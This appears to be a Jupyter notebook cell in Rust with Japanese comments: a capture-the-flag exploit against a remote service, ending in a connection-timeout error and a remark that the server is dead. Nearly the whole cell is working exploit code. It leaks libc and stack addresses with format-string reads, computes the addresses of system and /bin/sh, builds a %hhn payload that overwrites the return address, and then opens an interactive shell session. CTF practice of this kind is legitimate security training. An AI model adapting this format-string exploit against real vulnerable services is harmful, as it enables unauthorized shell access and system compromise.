In [3]:
use std::io::{Read, Write, self};
use std::net::TcpStream;
use std::str;

{
    // 接続先設定
    let host = "ctfq.u1tramarine.blue";
    let port = 10023;
    let mut stream = TcpStream::connect(format!("{}:{}", host, port))?;
    println!("[+] Connected to {}:{}", host, port);

    let mut buffer = [0; 2048];

    // 1. Welcome & Name prompt
    stream.read(&mut buffer)?; // Welcome
    stream.read(&mut buffer)?; // What's your name?

    // 2. libcのアドレスをリーク (__libc_start_main+230)
    stream.write_all(b"%91$x\n")?;
    let n = stream.read(&mut buffer)?;
    let recv_str = str::from_utf8(&buffer[..n]).unwrap();
    
    // "Hi, [address] ..." からアドレスを抽出
    let leak_addr_str = recv_str.trim_start_matches("Hi, ").split_whitespace().next().unwrap();
    let libc_start_main_230 = u32::from_str_radix(leak_addr_str, 16).unwrap();
    let libc_base = libc_start_main_230 - 230 - 0x018d90; // オフセットは環境(libc)に依存

    // 各関数のアドレス計算 (Pythonコードの定数を使用)
    let system_addr = libc_base + 0x018d90 + 148256; 
    let binsh_addr = libc_base + 0x018d90 + 1309636;
    println!("[*] System: 0x{:08x}", system_addr);
    println!("[*] /bin/sh: 0x{:08x}", binsh_addr);

    // 3. リターンアドレスの場所を特定
    stream.write_all(b"%78$x\n")?;
    let n = stream.read(&mut buffer)?;
    let recv_str = str::from_utf8(&buffer[..n]).unwrap();
    let stack_leak = u32::from_str_radix(recv_str.trim_start_matches("Hi, ").split_whitespace().next().unwrap(), 16).unwrap();
    let ret_addr_ptr = stack_leak - 44;
    println!("[*] Target Return Addr Ptr: 0x{:08x}", ret_addr_ptr);

    // 4. ペイロード構築 (Format String Attack)
    let index = 7;
    let mut payload = Vec::new();

    // 書き込み先アドレスのセット (4バイトずつ計8箇所)
    for i in 0..4 { payload.extend_from_slice(&(ret_addr_ptr + i).to_le_bytes()); }
    for i in 0..4 { payload.extend_from_slice(&(ret_addr_ptr + 8 + i).to_le_bytes()); }

    // 各バイトの書き込み値を計算 (Pythonの map(ord, ...) ロジック)
    let s_bytes = system_addr.to_le_bytes();
    let b_bytes = binsh_addr.to_le_bytes();
    let mut target = [s_bytes[0], s_bytes[1], s_bytes[2], s_bytes[3], b_bytes[0], b_bytes[1], b_bytes[2], b_bytes[3]];
    
    let mut current_len = payload.len() as u32;
    let mut fmt_string = String::new();

    for i in 0..8 {
        let write_val = if target[i] as u32 <= current_len {
            (target[i] as u32 + 256 - current_len) % 256
        } else {
            (target[i] as u32 - current_len) % 256
        };
        let write_val = if write_val == 0 { 256 } else { write_val };
        fmt_string.push_str(&format!("%{}c%{}$hhn", write_val, index + i));
        current_len = target[i] as u32;
    }

    payload.extend_from_slice(fmt_string.as_bytes());
    payload.push(b'\n');

    // 5. 送信とインタラクト
    stream.write_all(&payload)?;
    println!("[+] Payload sent. Switching to interact mode...");

    // Telnet.interact() の代わり
    let mut stdout = io::stdout();
    let mut stream_copy = stream.try_clone()?;
    
    std::thread::spawn(move || {
        let mut buf = [0; 1024];
        while let Ok(n) = stream_copy.read(&mut buf) {
            if n == 0 { break; }
            stdout.write_all(&buf[..n]).unwrap();
            stdout.flush().unwrap();
        }
    });

    let mut input = String::new();
    while io::stdin().read_line(&mut input).is_ok() {
        stream.write_all(input.as_bytes())?;
        input.clear();
    }
}

接続済みの呼び出し先が一定の時間を過ぎても正しく応答しなかったため、接続できませんでした。または接続済みのホストが応答しなかったため、確立された接続は失敗しました。 (os error 10060)


サーバーしんでますよー